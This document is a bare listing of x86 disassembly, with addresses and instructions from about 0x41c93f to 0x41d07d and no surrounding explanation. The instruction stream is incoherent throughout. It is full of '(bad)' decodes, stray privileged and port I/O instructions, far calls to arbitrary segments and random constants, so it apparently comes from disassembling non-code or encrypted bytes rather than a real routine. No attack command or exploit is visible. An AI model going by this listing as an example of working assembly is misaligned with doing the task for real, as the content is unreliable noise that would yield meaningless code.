  41c93f:	test   BYTE PTR [ebx],bl
  41c941:	pop    ebp
  41c942:	jecxz  0x41c8f6
  41c944:	xor    DWORD PTR [edi-0x6f],edx
  41c947:	ret    
  41c948:	push   edx
  41c949:	sub    BYTE PTR [ecx-0x20],0x9d
  41c94d:	jecxz  0x41c918
  41c94f:	or     BYTE PTR [edi],al
  41c951:	jle    0x41c95c
  41c953:	xchg   esi,eax
  41c954:	jae    0x41c9d4
  41c956:	add    eax,0xe5f0c329
  41c95b:	iret   
  41c95c:	cli    
  41c95d:	inc    edx
  41c95e:	sbb    BYTE PTR [ecx-0x70],dl
  41c961:	or     al,0x95
  41c963:	xchg   ecx,eax
  41c964:	xchg   ebp,eax
  41c965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c966:	pop    si
  41c968:	lea    esi,[eax+0x2240e3d9]
  41c96e:	mov    cl,0x42
  41c970:	jmp    0x41c8fc
  41c972:	adc    eax,0x5cf0b8aa
  41c977:	rol    BYTE PTR [ebx-0x56],cl
  41c97a:	fwait
  41c97b:	loope  0x41c913
  41c97d:	inc    ecx
  41c97e:	in     eax,0x4a
  41c980:	xchg   edi,eax
  41c981:	jg     0x41c92b
  41c983:	ret    0x42fa
  41c986:	jnp    0x41c9d6
  41c988:	mov    ecx,0xec1fec16
  41c98d:	outs   dx,BYTE PTR ds:[esi]
  41c98e:	dec    ebx
  41c98f:	mov    ch,0xc5
  41c991:	out    dx,eax
  41c992:	daa    
  41c993:	pop    ebx
  41c994:	mov    fs:0x8f2da2b3,eax
  41c99a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c99b:	add    eax,0x347e9d67
  41c9a0:	jo     0x41c9b8
  41c9a2:	and    dh,BYTE PTR [ecx-0x10]
  41c9a5:	or     BYTE PTR [ebx],ah
  41c9a7:	icebp  
  41c9a8:	(bad)  
  41c9a9:	or     al,0xf0
  41c9ab:	fild   WORD PTR [edx-0x49]
  41c9ae:	mov    ah,0x6c
  41c9b0:	push   ss
  41c9b1:	repnz icebp 
  41c9b3:	scas   al,BYTE PTR es:[edi]
  41c9b4:	pop    eax
  41c9b5:	call   0x5387:0x4d766c2e
  41c9bc:	sbb    cl,BYTE PTR [ecx+0x4a]
  41c9bf:	retf   0xab4d
  41c9c2:	xchg   esi,eax
  41c9c3:	push   eax
  41c9c4:	xor    al,BYTE PTR [ecx+0x334b1137]
  41c9ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9cb:	cmc    
  41c9cc:	arpl   di,bp
  41c9ce:	jmp    0xe4f0:0xa132cb32
  41c9d5:	xlat   BYTE PTR ds:[ebx]
  41c9d6:	outs   dx,DWORD PTR ds:[esi]
  41c9d7:	pop    esp
  41c9d8:	push   edi
  41c9d9:	rcl    ebx,0x2e
  41c9dc:	inc    edi
  41c9dd:	push   ecx
  41c9de:	sub    eax,0x8b2e8e18
  41c9e3:	mov    edi,0xcf90bdbf
  41c9e8:	ds mov eax,0xc9126f55
  41c9ee:	sbb    cl,BYTE PTR [esi]
  41c9f0:	imul   ebx,edi,0xdd7cf204
  41c9f6:	pop    ebp
  41c9f7:	aas    
  41c9f8:	jb     0x41c9ea
  41c9fa:	mov    gs,WORD PTR [ebx]
  41c9fc:	jnp    0x41ca63
  41c9fe:	inc    ecx
  41c9ff:	push   0xffffffbc
  41ca01:	gs cwde 
  41ca03:	mov    ah,0xe5
  41ca05:	push   ds
  41ca06:	jle    0x41ca44
  41ca08:	imul   BYTE PTR ds:0x72efc238
  41ca0e:	pushf  
  41ca0f:	inc    eax
  41ca10:	sbb    BYTE PTR [edi-0x6e281cb7],bh
  41ca16:	cmp    eax,0x45e4aa4c
  41ca1b:	mov    dl,0xfb
  41ca1d:	ins    DWORD PTR es:[edi],dx
  41ca1e:	out    dx,eax
  41ca1f:	mov    eax,0xe4f259b
  41ca24:	pop    ebx
  41ca25:	retf   0x439a
  41ca28:	sbb    ebx,DWORD PTR [ebp+ebp*2+0x25]
  41ca2c:	aas    
  41ca2d:	xor    al,0x13
  41ca2f:	test   al,0x8c
  41ca31:	cmp    bl,BYTE PTR [ebx+0x13]
  41ca34:	mov    ebp,0xe0436ccc
  41ca39:	mov    ecx,0x952fbcb6
  41ca3e:	addr16 dec edi
  41ca40:	jp     0x41ca2e
  41ca42:	dec    edi
  41ca43:	and    BYTE PTR [edx],ch
  41ca45:	loope  0x41c9e5
  41ca47:	les    ecx,FWORD PTR [ecx]
  41ca49:	sar    BYTE PTR [edx-0x4],0xf5
  41ca4d:	xchg   ebx,eax
  41ca4e:	jg     0x41ca69
  41ca50:	mov    ah,0x4
  41ca52:	fcomp  QWORD PTR [ebp-0x4eb0a838]
  41ca58:	imul   ebp,DWORD PTR [eax+0x37f4f44d],0x3b
  41ca5f:	in     eax,dx
  41ca60:	inc    esp
  41ca61:	dec    ebx
  41ca62:	out    0x50,al
  41ca64:	or     al,0x82
  41ca66:	dec    esp
  41ca67:	xchg   ebx,eax
  41ca68:	(bad)  
  41ca69:	fadd   DWORD PTR [ebx+esi*8-0x2b762c7f]
  41ca70:	and    eax,0x18a6a716
  41ca75:	or     BYTE PTR [edx+edi*4],ah
  41ca78:	outs   dx,DWORD PTR gs:[esi]
  41ca7a:	shl    DWORD PTR [ebp-0x63],1
  41ca7d:	jns    0x41ca73
  41ca7f:	clc    
  41ca80:	clc    
  41ca81:	inc    ebx
  41ca82:	fist   WORD PTR [ebp+ecx*2-0x2a7de819]
  41ca89:	not    dh
  41ca8b:	pop    esi
  41ca8c:	sub    ebp,DWORD PTR [esi]
  41ca8e:	fistp  WORD PTR [edx-0x7b]
  41ca91:	out    dx,al
  41ca92:	stos   BYTE PTR es:[edi],al
  41ca93:	in     eax,0x1f
  41ca95:	mov    ecx,0x5016b8ae
  41ca9a:	not    ecx
  41ca9c:	pop    esp
  41ca9d:	and    BYTE PTR [edx-0x263b3b85],ch
  41caa3:	or     al,0x37
  41caa5:	mov    bl,0x22
  41caa7:	or     al,0x7
  41caa9:	jge    0x41caf5
  41caab:	mov    ah,0xce
  41caad:	sub    BYTE PTR [ebp-0x5141c123],ah
  41cab3:	xor    DWORD PTR [edi-0x21],esi
  41cab6:	inc    esp
  41cab7:	arpl   di,si
  41cab9:	xchg   DWORD PTR [edx],ecx
  41cabb:	mov    esi,DWORD PTR [edi]
  41cabd:	dec    esp
  41cabe:	retf   
  41cabf:	mov    ecx,0x65859eeb
  41cac4:	xchg   edx,eax
  41cac5:	lea    esi,[edi]
  41cac7:	mov    bh,0x53
  41cac9:	xor    BYTE PTR ds:0x2e13472,al
  41cacf:	stos   BYTE PTR es:[edi],al
  41cad0:	and    BYTE PTR [eax+0x3a],cl
  41cad3:	shl    DWORD PTR [esi-0xf],0xa8
  41cad7:	mov    edx,0xc54c275a
  41cadc:	lock repnz or al,0x40
  41cae0:	mov    ah,0x7c
  41cae2:	aad    0x3a
  41cae4:	nop
  41cae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cae6:	adc    BYTE PTR [ebx-0x48],0x2c
  41caea:	adc    BYTE PTR [ebx+0x508f1f00],0x58
  41caf1:	add    cl,dh
  41caf3:	dec    esi
  41caf4:	cld    
  41caf5:	pop    edi
  41caf6:	mov    ah,0xbb
  41caf8:	sbb    DWORD PTR [edi+0x3d2623ee],eax
  41cafe:	fistp  QWORD PTR [ebx-0x7]
  41cb01:	and    al,0x6a
  41cb03:	or     eax,0x90c944ba
  41cb08:	out    0x21,al
  41cb0a:	or     ah,BYTE PTR ds:0x2ac3077a
  41cb10:	pop    edi
  41cb11:	ja     0x41cb87
  41cb13:	mov    bl,0x84
  41cb15:	imul   ebp,DWORD PTR [edx],0xffffffe0
  41cb18:	outs   dx,BYTE PTR ds:[esi]
  41cb19:	or     DWORD PTR [ebp+0x6ecdd2cd],eax
  41cb1f:	or     BYTE PTR [esi-0x7e94d177],dl
  41cb25:	js     0x41cb67
  41cb27:	arpl   WORD PTR [ebx-0x8764523],ax
  41cb2d:	add    DWORD PTR [eax+ebp*2-0x7],0x65
  41cb32:	mov    ch,BYTE PTR [ecx-0x1bdcb145]
  41cb38:	outs   dx,DWORD PTR ds:[esi]
  41cb39:	ins    DWORD PTR es:[edi],dx
  41cb3a:	cmp    dh,al
  41cb3c:	bswap  edx
  41cb3e:	add    edi,edx
  41cb40:	call   0x124f:0x20d530ff
  41cb47:	mov    ah,0xfb
  41cb49:	xchg   DWORD PTR [esi+edi*1+0x68],ebx
  41cb4d:	adc    eax,0x70524e54
  41cb52:	retf   0x8a6f
  41cb55:	xchg   ebp,eax
  41cb56:	cmp    DWORD PTR [ecx+0x6be8aae],eax
  41cb5c:	mov    ds:0xb1929e78,al
  41cb61:	push   edx
  41cb62:	test   al,0xec
  41cb64:	repnz lea esp,[ebx]
  41cb67:	test   BYTE PTR [ecx-0x2decffa3],bh
  41cb6d:	and    BYTE PTR [ebp+0x13dfd68d],0x85
  41cb74:	outs   dx,DWORD PTR ds:[esi]
  41cb75:	inc    ebp
  41cb76:	xchg   esi,eax
  41cb77:	dec    edx
  41cb78:	pop    ebx
  41cb79:	inc    edx
  41cb7a:	xor    ch,BYTE PTR [esp+eax*2-0x49f4982f]
  41cb81:	test   BYTE PTR [ecx-0xf022767],0xfd
  41cb88:	stos   DWORD PTR es:[edi],eax
  41cb89:	mov    ds:0x6b422145,al
  41cb8e:	xor    dh,BYTE PTR [edi+0x52]
  41cb91:	xor    al,0x69
  41cb93:	loop   0x41cbca
  41cb95:	imul   edx,DWORD PTR [ebx-0x132841b9],0x70
  41cb9c:	sbb    esp,DWORD PTR [ebx]
  41cb9e:	push   eax
  41cb9f:	in     eax,dx
  41cba0:	sub    al,0x5e
  41cba2:	pusha  
  41cba3:	fcmovb st,st(1)
  41cba5:	jp     0x41cc16
  41cba7:	cmp    BYTE PTR [edi],0x8f
  41cbaa:	ret    
  41cbab:	aam    0xbe
  41cbad:	cmp    cl,ch
  41cbaf:	ret    0x8777
  41cbb2:	imul   eax,DWORD PTR [ecx],0xdd3546f0
  41cbb8:	xchg   ebp,eax
  41cbb9:	cwde   
  41cbba:	pextrw ecx,(bad),0xc5
  41cbbc:	mov    WORD PTR [ecx+0xc],?
  41cbbf:	cwde   
  41cbc0:	pop    ecx
  41cbc1:	lock adc ebx,ebx
  41cbc4:	sbb    al,0xdb
  41cbc6:	ins    DWORD PTR es:[edi],dx
  41cbc7:	xchg   esp,eax
  41cbc8:	lods   eax,DWORD PTR ds:[esi]
  41cbc9:	mov    ds:0x80da6db6,al
  41cbce:	push   ds
  41cbcf:	pusha  
  41cbd0:	rcl    DWORD PTR [eax],cl
  41cbd2:	push   0x25434979
  41cbd7:	mov    edx,0x87baf91e
  41cbdc:	jg     0x41cb69
  41cbde:	sub    BYTE PTR ds:0x74536dd6,bl
  41cbe4:	pusha  
  41cbe5:	test   BYTE PTR ds:0x4052c0fb,cl
  41cbeb:	arpl   WORD PTR [ecx],cx
  41cbed:	adc    ch,BYTE PTR [ecx-0x375430a3]
  41cbf3:	inc    esi
  41cbf4:	lahf   
  41cbf5:	js     0x41cc05
  41cbf7:	adc    esp,DWORD PTR [ecx+edi*1-0x11]
  41cbfb:	scas   al,BYTE PTR es:[edi]
  41cbfc:	(bad)  [ebp-0x46]
  41cbff:	jmp    0x41cbd5
  41cc01:	jae    0x41cbf0
  41cc03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc05:	(bad)  
  41cc06:	(bad)  
  41cc07:	mov    bh,0x20
  41cc09:	(bad)  
  41cc0a:	mov    DWORD PTR [ebp+esi*2+0x35],eax
  41cc0e:	(bad)  
  41cc0f:	jno    0x41cc34
  41cc11:	arpl   WORD PTR [eax+0x4ddb6e42],dx
  41cc17:	and    al,0xa5
  41cc19:	test   DWORD PTR [edi-0x1a],edx
  41cc1c:	dec    esi
  41cc1d:	xor    al,0x72
  41cc1f:	(bad)  
  41cc20:	push   ecx
  41cc21:	popf   
  41cc22:	mul    BYTE PTR [ebx-0x7]
  41cc25:	jbe    0x41cc6f
  41cc27:	dec    eax
  41cc28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc29:	mov    ch,0xbe
  41cc2b:	ja     0x41cca9
  41cc2d:	cli    
  41cc2e:	xchg   edx,eax
  41cc2f:	and    eax,0x249d7e0a
  41cc34:	mov    esi,0xd441f11a
  41cc39:	cmp    eax,0x6f91dbd8
  41cc3e:	mov    al,0x92
  41cc40:	icebp  
  41cc41:	pop    ebp
  41cc42:	xchg   ebp,ebp
  41cc44:	or     al,0x87
  41cc46:	(bad)  
  41cc47:	stos   DWORD PTR es:[edi],eax
  41cc48:	sub    dh,BYTE PTR [ecx+0x10]
  41cc4b:	sbb    edx,DWORD PTR [ecx-0x76]
  41cc4e:	pop    es
  41cc4f:	mov    bh,0x3a
  41cc51:	loop   0x41cc28
  41cc53:	scas   eax,DWORD PTR es:[edi]
  41cc54:	call   0xb957:0xe2cf6981
  41cc5b:	call   0xd46e:0xc3042c81
  41cc62:	adc    DWORD PTR [eax-0x17],0x5a
  41cc66:	outs   dx,BYTE PTR ds:[esi]
  41cc67:	push   edx
  41cc68:	(bad)  
  41cc69:	push   ebx
  41cc6a:	ja     0x41cbf3
  41cc6c:	in     eax,0xf6
  41cc6e:	inc    ecx
  41cc6f:	popa   
  41cc70:	and    BYTE PTR [eax],dh
  41cc72:	lock pop esi
  41cc74:	cld    
  41cc75:	arpl   ax,di
  41cc77:	dec    ebx
  41cc78:	inc    esp
  41cc79:	sbb    BYTE PTR [edi+eiz*1+0x47ead9d6],al
  41cc80:	hlt    
  41cc81:	repnz (bad) 
  41cc84:	lods   eax,DWORD PTR ds:[esi]
  41cc85:	or     eax,0xfa52b385
  41cc8a:	mov    dl,0xcf
  41cc8c:	xor    ch,BYTE PTR [edi+0x4a]
  41cc8f:	jmp    0x2a6732cf
  41cc94:	idiv   BYTE PTR [esi]
  41cc96:	pop    eax
  41cc97:	dec    esi
  41cc98:	daa    
  41cc99:	lock cmp cl,BYTE PTR [ebx-0x11a49231]
  41cca0:	jle    0x41cc3b
  41cca2:	test   BYTE PTR [eax+0x6bbc7047],ch
  41cca8:	mov    esp,DWORD PTR [ecx-0x7a]
  41ccab:	or     edi,esi
  41ccad:	push   0xffffff99
  41ccaf:	xor    WORD PTR [eax],ax
  41ccb2:	ret    0x54d5
  41ccb5:	sbb    eax,0x368a9884
  41ccba:	ins    BYTE PTR es:[edi],dx
  41ccbb:	jp     0x41cc92
  41ccbd:	sahf   
  41ccbe:	loopne 0x41cd0d
  41ccc0:	fldl2t 
  41ccc2:	pop    esp
  41ccc3:	push   cs
  41ccc4:	mov    cl,0xde
  41ccc6:	mov    eax,ds:0xd6ab3a45
  41cccb:	xor    al,0x9b
  41cccd:	mov    cs,WORD PTR ds:0x59fb96b1
  41ccd3:	int3   
  41ccd4:	stos   DWORD PTR es:[edi],eax
  41ccd5:	xlat   BYTE PTR ds:[ebx]
  41ccd6:	sub    DWORD PTR [esi+0x45],edx
  41ccd9:	ins    DWORD PTR es:[edi],dx
  41ccda:	mov    BYTE PTR [edi],dh
  41ccdc:	mov    edi,0x11118c79
  41cce1:	mov    WORD PTR [ebp+0x8],es
  41cce4:	jbe    0x41cc96
  41cce6:	cdq    
  41cce7:	fcmovb st,st(0)
  41cce9:	int3   
  41ccea:	or     eax,0x34ee8f14
  41ccef:	ret    
  41ccf0:	in     al,0xa0
  41ccf2:	icebp  
  41ccf3:	sbb    BYTE PTR [ebx],0xa6
  41ccf6:	sub    BYTE PTR [ecx+eiz*8],0x86
  41ccfa:	es std 
  41ccfc:	push   es
  41ccfd:	mov    eax,0x3897bdc3
  41cd02:	dec    ecx
  41cd03:	data16 arpl WORD PTR [esi],di
  41cd06:	xor    esi,DWORD PTR [ecx+edi*1-0x6]
  41cd0a:	lahf   
  41cd0b:	in     al,0xed
  41cd0d:	test   eax,0xa42c189b
  41cd12:	jb     0x41cd50
  41cd14:	adc    BYTE PTR [ecx],bl
  41cd16:	mov    cl,0x85
  41cd18:	push   edx
  41cd19:	out    dx,al
  41cd1a:	pop    ss
  41cd1b:	lahf   
  41cd1c:	scas   eax,DWORD PTR es:[edi]
  41cd1d:	mov    edi,0x33966075
  41cd22:	mov    ebx,0x1eee187
  41cd27:	cdq    
  41cd28:	adc    BYTE PTR [eax+0x1e],0xcc
  41cd2c:	sbb    esp,DWORD PTR [ecx+eax*4-0x4a2c95d1]
  41cd33:	cmp    eax,0x5ede6355
  41cd38:	in     al,0x3b
  41cd3a:	mov    ebp,0xed5ba9e2
  41cd3f:	jg     0x41cd5f
  41cd41:	rcr    BYTE PTR [ecx-0x20],0x87
  41cd45:	sti    
  41cd46:	and    eax,DWORD PTR [edx+0x1b]
  41cd49:	mov    esi,DWORD PTR ds:[eax-0x76]
  41cd4d:	icebp  
  41cd4e:	push   esp
  41cd4f:	jl     0x41cd05
  41cd51:	out    0xe6,al
  41cd53:	sbb    dh,BYTE PTR [ebx+0x30]
  41cd56:	cdq    
  41cd57:	and    DWORD PTR [ecx-0x6130f64],0x4bd66d6d
  41cd61:	dec    eax
  41cd62:	ja     0x41cd88
  41cd64:	or     eax,0xc35fcb69
  41cd69:	inc    esp
  41cd6a:	pop    edi
  41cd6b:	add    ah,BYTE PTR [eax]
  41cd6d:	push   ecx
  41cd6e:	dec    esp
  41cd6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd70:	test   BYTE PTR [edi-0x340f78c2],0xfb
  41cd77:	cmp    eax,0xbd8f7d53
  41cd7c:	ja     0x41cde7
  41cd7e:	retf   0x36e8
  41cd81:	push   0xffffffa0
  41cd83:	fld    st(1)
  41cd85:	leave  
  41cd86:	sar    DWORD PTR [ebp-0x67],0x81
  41cd8a:	dec    ebp
  41cd8b:	cmp    eax,0x2c0a95a9
  41cd90:	mov    eax,0x9be0982e
  41cd95:	xchg   esi,eax
  41cd96:	rcr    BYTE PTR [ebx-0x35d0b9e7],0x35
  41cd9d:	xor    edi,DWORD PTR [ebx-0x63]
  41cda0:	dec    esp
  41cda1:	ret    0x86ec
  41cda4:	dec    ebx
  41cda5:	vhaddps xmm3,xmm3,XMMWORD PTR [edi+ebx*2+0x55]
  41cdab:	jae    0x41cd3d
  41cdad:	add    DWORD PTR [edx],edi
  41cdaf:	mov    dl,0x3e
  41cdb1:	push   0xffffffa5
  41cdb3:	mov    edi,0x5da2bd43
  41cdb8:	mov    bl,0x80
  41cdba:	sbb    edx,ecx
  41cdbc:	dec    ecx
  41cdbd:	jae    0x41ce03
  41cdbf:	pop    ebp
  41cdc0:	push   edx
  41cdc1:	rol    BYTE PTR [esi],0xc3
  41cdc4:	sub    ah,BYTE PTR [esi+0x32]
  41cdc7:	cmp    DWORD PTR [ecx],0x3a
  41cdca:	je     0x41cdf1
  41cdcc:	jmp    0x8126bf74
  41cdd1:	or     ah,BYTE PTR [esi-0x1d005a1e]
  41cdd7:	(bad)  
  41cdd8:	jae    0x41ce15
  41cdda:	mov    eax,ds:0x51d0f95f
  41cddf:	icebp  
  41cde0:	pop    ss
  41cde1:	call   0x45d80356
  41cde6:	adc    bl,BYTE PTR [ecx-0x7a]
  41cde9:	or     ebx,DWORD PTR [esp+ecx*2]
  41cdec:	sub    eax,0xb8c625f5
  41cdf1:	sub    BYTE PTR [ebx-0x73],ah
  41cdf4:	pop    ebp
  41cdf5:	push   ebx
  41cdf6:	xlat   BYTE PTR ds:[ebx]
  41cdf7:	adc    dh,dl
  41cdf9:	jle    0x41ce12
  41cdfb:	push   ds
  41cdfc:	clc    
  41cdfd:	lahf   
  41cdfe:	fiadd  WORD PTR [eax]
  41ce00:	hlt    
  41ce01:	mov    ah,BYTE PTR [edx+0x513ae35d]
  41ce07:	sub    al,0x80
  41ce09:	or     edx,DWORD PTR [ebx+0x24]
  41ce0c:	mov    bl,0xa0
  41ce0e:	mov    ecx,esi
  41ce10:	add    ebx,edi
  41ce12:	dec    ebx
  41ce13:	enter  0x9e38,0x7
  41ce17:	mov    bl,BYTE PTR [ebp-0x72420b00]
  41ce1d:	mov    al,0x52
  41ce1f:	mov    ah,BYTE PTR [ebp-0x4bf9eeae]
  41ce25:	outs   dx,BYTE PTR ds:[esi]
  41ce26:	jno    0x41ce3d
  41ce28:	mov    gs,edi
  41ce2a:	mov    bl,0x76
  41ce2c:	cmp    esi,DWORD PTR [ebx]
  41ce2e:	test   esp,0x3491b7e3
  41ce34:	jg     0x41cdcc
  41ce36:	adc    eax,0xce6caa33
  41ce3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce3c:	stos   DWORD PTR es:[edi],eax
  41ce3d:	pop    edi
  41ce3e:	jo     0x41ce07
  41ce40:	mov    bl,0xc9
  41ce42:	test   al,0xa6
  41ce44:	int    0xc7
  41ce46:	mulps  xmm5,XMMWORD PTR [esi-0x4e76ca47]
  41ce4d:	pop    ebx
  41ce4e:	ins    DWORD PTR es:[edi],dx
  41ce4f:	aas    
  41ce50:	daa    
  41ce51:	retf   
  41ce52:	cld    
  41ce53:	mov    esi,0x64710b8c
  41ce58:	mov    ebx,0xa5b08d02
  41ce5d:	es add ecx,esp
  41ce60:	and    BYTE PTR [eax],0x75
  41ce63:	pop    esi
  41ce64:	and    DWORD PTR [esi+0x66760939],ebp
  41ce6a:	mov    al,ds:0xbce2db50
  41ce6f:	leave  
  41ce70:	popf   
  41ce71:	and    DWORD PTR [esi+ebx*2],esp
  41ce74:	dec    ebp
  41ce75:	sub    al,0x2e
  41ce77:	ja     0x41ce63
  41ce79:	dec    ecx
  41ce7a:	cmp    BYTE PTR [edx-0x19],bh
  41ce7d:	push   ss
  41ce7e:	push   ds
  41ce7f:	dec    ebp
  41ce80:	pop    edi
  41ce81:	inc    ecx
  41ce82:	repz sbb BYTE PTR [ebx],ch
  41ce85:	mov    ?,ebp
  41ce87:	xor    BYTE PTR [edi+edi*8],dl
  41ce8a:	std    
  41ce8b:	loopne 0x41ce92
  41ce8d:	add    DWORD PTR [edi+0x1e],ecx
  41ce90:	cmp    DWORD PTR [edi+0x23ee5d7d],ebx
  41ce96:	sbb    al,0x3e
  41ce98:	std    
  41ce99:	call   0x3919:0xc8909687
  41cea0:	in     eax,dx
  41cea1:	xchg   ecx,eax
  41cea2:	out    0x5e,al
  41cea4:	mov    ecx,0x135c1af9
  41cea9:	jp     0x41ce67
  41ceab:	and    DWORD PTR [esi-0x4d4d97d9],esi
  41ceb1:	jmp    0x60b6:0x2f707c61
  41ceb8:	shl    BYTE PTR [edx-0x1c088a59],0x61
  41cebf:	inc    ebx
  41cec0:	xchg   esp,eax
  41cec1:	push   edx
  41cec2:	add    al,0xd7
  41cec4:	dec    eax
  41cec5:	sbb    dh,BYTE PTR [ecx+0x73]
  41cec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cec9:	mov    edx,0xb6651793
  41cece:	arpl   WORD PTR [ecx],cx
  41ced0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ced1:	in     al,dx
  41ced2:	cmp    DWORD PTR [esi-0x44b8fcc5],0x7d64d098
  41cedc:	ins    DWORD PTR es:[edi],dx
  41cedd:	fidiv  WORD PTR [ebp+0x6e]
  41cee0:	out    0x32,al
  41cee2:	push   0xffffffa3
  41cee4:	rol    BYTE PTR [eax-0x67],1
  41cee7:	jl     0x41cefa
  41cee9:	aad    0x90
  41ceeb:	fs loopne 0x41cf69
  41ceee:	scas   eax,DWORD PTR es:[edi]
  41ceef:	mov    BYTE PTR [edx-0x2f],bl
  41cef2:	rcl    DWORD PTR [edi],0xee
  41cef5:	fnstcw WORD PTR [ecx+0x4a]
  41cef8:	push   0xffffff84
  41cefa:	mov    dh,0xaf
  41cefc:	(bad)
  41ceff:	push   0xffffffa2
  41cf01:	xchg   esi,eax
  41cf02:	(bad)  
  41cf03:	in     eax,0xbd
  41cf05:	aas    
  41cf06:	popf   
  41cf07:	jnp    0x41cf83
  41cf09:	int    0x9f
  41cf0b:	pushf  
  41cf0c:	shl    cl,1
  41cf0e:	sbb    eax,0x15bef864
  41cf13:	sub    DWORD PTR ds:0x7a2bad3e,ecx
  41cf19:	xor    al,0x8c
  41cf1b:	push   eax
  41cf1c:	add    edi,DWORD PTR [eax+edx*1+0x4b]
  41cf20:	sbb    DWORD PTR [esi],esi
  41cf22:	push   ds
  41cf23:	push   cs
  41cf24:	fstp   DWORD PTR [eax+edi*1]
  41cf27:	push   0xa0ac4160
  41cf2c:	imul   ebp,DWORD PTR [esi-0x1574a0a7],0x814ab5ff
  41cf36:	push   0xffffffde
  41cf38:	push   ecx
  41cf39:	xchg   esi,eax
  41cf3a:	jmp    0x2b8ca472
  41cf3f:	and    ebp,0x7a
  41cf42:	test   al,0xe6
  41cf44:	adc    esp,DWORD PTR [edx+0x15c2723c]
  41cf4a:	cmp    al,0x16
  41cf4c:	add    BYTE PTR [eax+0x61],cl
  41cf4f:	aas    
  41cf50:	push   ecx
  41cf51:	add    al,0xaf
  41cf53:	dec    esp
  41cf54:	(bad)  
  41cf55:	sub    bl,bl
  41cf57:	push   es
  41cf58:	ins    BYTE PTR es:[edi],dx
  41cf59:	mov    esp,0xf0479129
  41cf5e:	push   ebp
  41cf5f:	cdq    
  41cf60:	push   0x6ad0317
  41cf65:	xor    eax,0x864c92a1
  41cf6a:	pop    es
  41cf6b:	scas   al,BYTE PTR es:[edi]
  41cf6c:	jnp    0x41cf3a
  41cf6e:	inc    ecx
  41cf6f:	enter  0x5432,0x66
  41cf73:	add    eax,0x9e480337
  41cf78:	jno    0x41cf23
  41cf7a:	pop    ebp
  41cf7b:	cwde   
  41cf7c:	xchg   ecx,ebp
  41cf7e:	pop    esp
  41cf7f:	push   ecx
  41cf80:	fst    DWORD PTR [ebx]
  41cf82:	leave  
  41cf83:	ret    0xcc9e
  41cf86:	nop
  41cf87:	ins    BYTE PTR es:[edi],dx
  41cf88:	cdq    
  41cf89:	addr16 xchg esi,eax
  41cf8b:	fld    DWORD PTR [eax]
  41cf8d:	lods   al,BYTE PTR ds:[esi]
  41cf8e:	pop    ecx
  41cf8f:	fcomp  QWORD PTR ds:0xa377b8c1
  41cf95:	fnstenv [esi-0x4b2fb538]
  41cf9b:	mov    al,ds:0x79c06c5d
  41cfa0:	mov    ah,0x7d
  41cfa2:	lods   eax,DWORD PTR ds:[esi]
  41cfa3:	jp     0x41d00f
  41cfa5:	das    
  41cfa6:	xchg   ebp,eax
  41cfa7:	cmp    eax,0x52cac7f2
  41cfac:	pop    ebx
  41cfad:	clc    
  41cfae:	repnz in al,dx
  41cfb0:	xchg   bh,ah
  41cfb2:	add    BYTE PTR [esi-0x45145767],cl
  41cfb8:	fdiv   DWORD PTR [ebx+0x118eed51]
  41cfbe:	mov    cl,ah
  41cfc0:	icebp  
  41cfc1:	mov    bh,BYTE PTR [edx+0x4]
  41cfc4:	xlat   BYTE PTR ds:[ebx]
  41cfc5:	repnz add DWORD PTR [esi-0x4],edx
  41cfc9:	(bad)  
  41cfca:	mov    cl,0x66
  41cfcc:	inc    esp
  41cfcd:	mov    edx,0x7cb8e26f
  41cfd2:	sbb    eax,0xaf8cc009
  41cfd7:	int    0x81
  41cfd9:	mov    cs,WORD PTR [esi+ecx*1]
  41cfdc:	mov    bh,0x43
  41cfde:	lods   al,BYTE PTR ds:[esi]
  41cfdf:	in     eax,dx
  41cfe0:	jb     0x41d014
  41cfe2:	dec    ebx
  41cfe3:	push   es
  41cfe4:	dec    edx
  41cfe5:	mov    eax,ds:0x3e6594b9
  41cfea:	mov    ds:0xf89b3f67,al
  41cfef:	rol    DWORD PTR [eax+0x3043ccf5],1
  41cff5:	dec    eax
  41cff6:	pop    esi
  41cff7:	dec    ecx
  41cff8:	pop    ecx
  41cff9:	pop    edi
  41cffa:	dec    edx
  41cffb:	push   edi
  41cffc:	mov    eax,ds:0x9ec2b667
  41d001:	int    0x52
  41d003:	shl    BYTE PTR [ecx+esi*8+0x2a],0x54
  41d008:	aaa    
  41d009:	mov    al,cl
  41d00b:	cs xchg esi,eax
  41d00d:	push   edi
  41d00e:	xstore-rng (bad)
  41d00f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d010:	xchg   DWORD PTR [ebx-0x3d01bd3a],edi
  41d016:	cwde   
  41d017:	push   ebp
  41d018:	adc    al,0x9a
  41d01a:	cmp    al,0x13
  41d01c:	push   ecx
  41d01d:	in     eax,0x9d
  41d01f:	imul   DWORD PTR [ebp-0x1f30f3bc]
  41d025:	test   esi,ebx
  41d027:	pop    edi
  41d028:	cmp    edx,edx
  41d02a:	lea    esi,[edx]
  41d02c:	ficomp DWORD PTR [esi+0x2c53036d]
  41d032:	jmp    0x78eac753
  41d037:	or     al,0xe6
  41d039:	sbb    eax,0x3cefa64d
  41d03e:	mov    ah,BYTE PTR ds:0x9d84fab9
  41d044:	mov    ebx,0x1e362ccd
  41d049:	sbb    al,0x6f
  41d04b:	lahf   
  41d04c:	or     BYTE PTR [eax+0x27e4fc1f],cl
  41d052:	mov    eax,0x8440d138
  41d057:	cs test eax,0x62c536b6
  41d05d:	mov    BYTE PTR [ecx],0xac
  41d060:	retf   
  41d061:	ins    BYTE PTR es:[edi],dx
  41d062:	in     al,dx
  41d063:	inc    esi
  41d064:	adc    eax,0x6131854a
  41d069:	imul   DWORD PTR [esi]
  41d06b:	pusha  
  41d06c:	pop    es
  41d06d:	jnp    0x41d009
  41d06f:	addr16 jo 0x41d0bc
  41d072:	inc    eax
  41d073:	inc    ecx
  41d074:	xchg   BYTE PTR [ebx+ecx*4+0x3df31383],dh
  41d07b:	pop    esp
  41d07c:	inc    edi
  41d07d:	lock bnd jno 0x41d08d
